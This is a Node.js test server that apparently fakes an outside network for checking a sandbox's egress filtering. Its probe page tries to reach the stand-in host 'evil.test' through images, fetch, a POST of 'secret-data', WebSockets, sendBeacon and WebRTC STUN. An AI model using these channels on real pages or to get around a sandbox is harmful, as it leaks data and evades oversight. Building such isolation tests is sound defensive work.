import http from 'node:http';
import dgram from 'node:dgram';
import fs from 'node:fs';
import os from 'node:os';
import crypto from 'node:crypto';

const LOG = process.env.LOG_FILE || '/log/internet.jsonl';
const stream = fs.createWriteStream(LOG, { flags: 'a' });
const rec = (o) => stream.write(JSON.stringify({ t_ms: Date.now(), ...o }) + '\n');

const egressIp = () => {
  for (const ifs of Object.values(os.networkInterfaces())) {
    for (const i of ifs || []) {
      if (i.family === 'IPv4' && !i.internal) return i.address;
    }
  }
  return '127.0.0.1';
};
const MY_IP = egressIp();

const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

const probePage = (ip) => `<!doctype html><html><body>
<h1>probe</h1>
<script>
window.__probe = {};
const set = (k, v) => { window.__probe[k] = v; };
const j = (o) => JSON.parse(JSON.stringify(o));

const im1 = new Image();
im1.onload = () => set('img_evil', { ok: true });
im1.onerror = () => set('img_evil', { ok: false });
im1.src = 'http://evil.test:8080/img.png?k=img';

fetch('http://evil.test:8080/f?k=fetch')
  .then(r => set('fetch_evil', { ok: true, status: r.status }))
  .catch(e => set('fetch_evil', { ok: false, error: String(e) }));

fetch('http://evil.test:8080/post?k=post', { method: 'POST', body: 'secret-data', mode: 'no-cors' })
  .then(r => set('post_evil', { ok: true, type: r.type, status: r.status }))
  .catch(e => set('post_evil', { ok: false, error: String(e) }));

const w1 = new WebSocket('ws://evil.test:8080/ws?k=ws');
w1.onopen = () => set('ws_evil', { ok: true });
w1.onerror = () => set('ws_evil', { ok: false });

const w2 = new WebSocket('ws://allowed.test:8080/ws?k=ws_ok');
w2.onopen = () => { set('ws_ok', { ok: true }); w2.close(); };
w2.onerror = () => set('ws_ok', { ok: false });
w2.onmessage = (m) => set('ws_ok_msg', { msg: m.data });

const im2 = new Image();
im2.onload = () => set('img_wrongport', { ok: true });
im2.onerror = () => set('img_wrongport', { ok: false });
im2.src = 'http://allowed.test:8081/img.png?k=wrongport';

const im3 = new Image();
im3.onload = () => set('img_cdn', { ok: true });
im3.onerror = () => set('img_cdn', { ok: false });
im3.src = 'http://a.cdn.test:8080/img.png?k=cdn';

fetch('http://llm.test:8080/x?k=browser_to_llm')
  .then(r => set('browser_to_llm', { ok: true, status: r.status }))
  .catch(e => set('browser_to_llm', { ok: false, error: String(e) }));

fetch('http://proxy:3129/?k=agent_port_direct')
  .then(r => set('agent_port_direct', { ok: true, status: r.status }))
  .catch(e => set('agent_port_direct', { ok: false, error: String(e) }));

async function rtc(url, key) {
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: url }] });
    const cands = [];
    pc.onicecandidate = (e) => { if (e.candidate) cands.push(e.candidate.type + ':' + (e.candidate.address || '')); };
    pc.createDataChannel('x');
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise(r => setTimeout(r, 3000));
    pc.close();
    set(key, { ok: true, candidates: cands });
  } catch (e) {
    set(key, { ok: false, error: String(e) });
  }
}
rtc('stun:evil.test:3478', 'stun_dns');
rtc('stun:${ip}:3478', 'stun_ip');

set('beacon', { sent: navigator.sendBeacon('http://evil.test:8080/beacon?k=beacon', 'x') });
window.__probeDone = false;
setTimeout(() => { window.__probeDone = true; }, 3500);
</script></body></html>`;

const handler = (port) => (req, res) => {
  rec({ proto: 'http', host_header: req.headers.host || '', port, method: req.method, path: req.url, remote: req.socket.remoteAddress });
  if (req.url.startsWith('/probe')) {
    res.writeHead(200, { 'content-type': 'text/html', 'access-control-allow-origin': '*' });
    res.end(probePage(MY_IP));
  } else if (req.url.includes('.png')) {
    res.writeHead(200, { 'content-type': 'image/png', 'access-control-allow-origin': '*' });
    res.end(PNG);
  } else {
    res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
    res.end('ok');
  }
};

for (const port of [8080, 8081]) {
  const srv = http.createServer(handler(port));
  srv.on('upgrade', (req, socket) => {
    rec({ proto: 'ws', host_header: req.headers.host || '', port, method: 'GET', path: req.url, remote: socket.remoteAddress });
    const key = req.headers['sec-websocket-key'];
    const accept = crypto.createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
    socket.write(
      'HTTP/1.1 101 Switching Protocols\r\n' +
      'Upgrade: websocket\r\nConnection: Upgrade\r\n' +
      `Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
    );
    const msg = Buffer.from('hello');
    socket.write(Buffer.concat([Buffer.from([0x81, msg.length]), msg]));
    socket.on('error', () => {});
    socket.on('data', () => socket.destroy());
  });
  srv.listen(port, '0.0.0.0');
}

const udp = dgram.createSocket('udp4');
udp.on('message', (msg, rinfo) => {
  rec({ proto: 'udp', host_header: '', port: 3478, method: 'dgram', path: '', remote: `${rinfo.address}:${rinfo.port}`, bytes: msg.length });
});
udp.bind(3478);

console.log(`internet up: ip=${MY_IP} http=8080,8081 ws-upgrade udp=3478`);
